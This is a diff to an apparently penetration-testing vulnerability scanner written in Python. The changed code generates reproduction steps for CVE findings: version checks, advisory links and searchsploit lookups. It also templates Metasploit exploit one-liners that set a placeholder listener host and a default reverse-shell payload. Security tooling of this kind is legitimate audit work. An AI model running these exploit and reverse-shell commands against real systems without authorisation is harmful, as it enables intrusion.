@@ -324,9 +324,13 @@ class Scanner:
                 + self._c(f" -- {short}", _DIM)
             )
             if m["msf"]:
+                payload_hint = (
+                    f"  [{m['msf_payload']}]" if m.get("msf_payload") else ""
+                )
                 print(
                     self._c("   |   MSF: ", _DIM)
                     + self._c(m["msf"], "\033[92m")
+                    + self._c(payload_hint, _DIM)
                 )
 
         print(self._c("   |", _DIM))
@@ -351,34 +355,42 @@ class Scanner:
                 conf = "low"
 
             # Build reproduction steps
+            advisory = m.get("advisory", f"https://nvd.nist.gov/vuln/detail/{m['cve']}")
             repro_lines = [
                 "# 1. Confirm the service version:",
-                f'$ curl -s -k -I "{url}" | grep -i "Server\\|X-Powered-By"',
-                f"# Expected: {m['service'].title()}/{m['version']}",
+                f'$ curl -s -k -I "{url}" | grep -iE "Server|X-Powered-By|X-Generator"',
+                f"# Expected to contain: {m['service'].title()} {m['version']}",
                 "",
-                f"# 2. {m['cve']} (CVSS {m['cvss']}, {sev})",
+                f"# 2. Vulnerability: {m['cve']}  CVSS {m['cvss']}  [{sev}]",
                 f"# {m['impact'].split('. ')[0]}",
+                f"# Advisory: {advisory}",
             ]
             if m["msf"]:
+                payload = m.get("msf_payload") or "generic/shell_reverse_tcp"
                 repro_lines += [
                     "",
-                    "# 3. Verify with Metasploit:",
+                    "# 3. Verify exploitability with Metasploit:",
                     f'$ msfconsole -q -x "use {m["msf"]}; '
                     f'set RHOSTS {host}; set RPORT {port}; '
                     f'{ssl_flag}check"',
                     "",
-                    "# 4. Exploit (if confirmed vulnerable):",
+                    "# 4. Exploit (replace <LHOST> with your listener IP):",
                     f'$ msfconsole -q -x "use {m["msf"]}; '
                     f'set RHOSTS {host}; set RPORT {port}; '
+                    f'set LHOST <LHOST>; set PAYLOAD {payload}; '
                     f'{ssl_flag}run"',
+                    "",
+                    "# 5. Searchsploit for additional PoCs:",
+                    f'$ searchsploit "{m["cve"]}"',
                 ]
             else:
                 repro_lines += [
                     "",
                     "# 3. Search for public exploits:",
+                    f'$ searchsploit "{m["cve"]}"',
                     f'$ searchsploit "{m["service"]}" "{m["version"]}"',
                     "",
-                    f"# 4. Reference: https://nvd.nist.gov/vuln/detail/{m['cve']}",
+                    f"# 4. Advisory: {advisory}",
                 ]
 
             finding = Finding(
